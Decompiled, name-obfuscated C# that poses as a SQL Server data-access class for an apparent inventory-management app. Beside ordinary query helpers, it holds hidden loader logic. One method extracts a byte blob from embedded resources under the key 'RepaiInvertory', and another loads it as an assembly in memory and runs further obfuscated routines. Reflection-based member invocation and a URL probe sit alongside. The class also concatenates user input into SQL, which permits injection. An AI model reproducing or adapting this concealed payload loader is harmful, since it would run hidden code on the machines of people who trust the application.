using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Bj4;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using q5D;
using z0F;

namespace g6R;

public class Mw8
{
	protected SqlConnection SqlCon;

	protected SqlCommand SqlCom;

	protected SqlDataReader Sqldreader;

	protected SqlDataAdapter SqlDa;

	protected SqlCommandBuilder SqlComb;

	private string ConnectionString;

	public Mw8()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
		SqlCon = new SqlConnection();
		SqlCon.set_ConnectionString(ConnectionString);
	}

	internal static bool Gp4(string Hg2)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(Hg2);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public bool q7M()
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		try
		{
			if (SqlCon.get_State() != ConnectionState.Open)
			{
				SqlCon.set_ConnectionString(ConnectionString);
				SqlCon.Open();
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	protected bool q6B()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_002b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (SqlCon.get_State() != 0)
			{
				SqlCon.Close();
				return true;
			}
			return false;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Close Database");
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool r2B(string r7L, bool Gp7 = false)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_0031: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		if (q7M())
		{
			try
			{
				SqlCom = new SqlCommand(r7L, SqlCon);
				SqlCom.ExecuteNonQuery();
				return true;
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				if (Gp7)
				{
					Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Execute!");
				}
				result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				q6B();
				((Component)(object)SqlCom).Dispose();
			}
		}
		return result;
	}

	internal static byte[] e2P(string[] k1G, int p8T)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[k1G.Length - 1 + 1];
				int num = k1G.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = k1G[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)Tw8.mDic["Ass"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object)"RepaiInvertory", false))
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public SqlDataReader Xy6(string r3M)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		//IL_003c: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (q7M())
			{
				SqlCom = new SqlCommand(r3M, SqlCon);
				Sqldreader = SqlCom.ExecuteReader();
			}
			return Sqldreader;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataReader");
			SqlDataReader result = null;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			q6B();
			((Component)(object)SqlCom).Dispose();
		}
	}

	public object Fe1(string Fc7)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		object result = null;
		try
		{
			if (q7M())
			{
				SqlCom = new SqlCommand(Fc7, SqlCon);
				result = RuntimeHelpers.GetObjectValue(SqlCom.ExecuteScalar());
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Get Scalar");
			ProjectData.ClearProjectError();
		}
		finally
		{
			q6B();
			((Component)(object)SqlCom).Dispose();
		}
		return result;
	}

	public DataTable Xw0(string a4W)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006c: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		string text = string.Empty;
		try
		{
			text = a4W.Substring(14);
			text = text.Substring(0, checked(text.IndexOf(" ") + 1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		DataTable dataTable = new DataTable(text);
		SqlDa = new SqlDataAdapter(a4W, SqlCon);
		if (q7M())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get Datatable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				q6B();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public static string Bs8(string Gx1)
	{
		Type type = (Type)Tw8.mDic[Tw8.T];
		return Conversions.ToString(type.InvokeMember(Gx1, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	public DataTable Ao9(string w6C, string e3D)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0047: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable(w6C);
		SqlDa = new SqlDataAdapter("Select * from " + w6C + " Where " + e3D, SqlCon);
		if (q7M())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataTable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				q6B();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public bool Qs4(string a9X, DataTable e5A, bool q9N = false)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		SqlDa = new SqlDataAdapter();
		SqlDa.set_SelectCommand(new SqlCommand(a9X, SqlCon));
		SqlComb = new SqlCommandBuilder(SqlDa);
		try
		{
			if (q7M())
			{
				((DbDataAdapter)(object)SqlDa).Update(e5A);
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (q9N)
			{
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Warning");
			}
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			q6B();
			((Component)(object)SqlDa).Dispose();
			((Component)(object)SqlComb).Dispose();
		}
	}

	internal static void t1P()
	{
		Assembly value = Thread.GetDomain().Load((byte[])Tw8.mDic[Tw8.mArray]);
		Tw8.mDic.Add("Ass2", value);
		value = null;
		if (x5C.s1J())
		{
			s4H.Yi5();
		}
	}

	protected void Mt6()
	{
		q6B();
		GC.SuppressFinalize(this);
	}
}
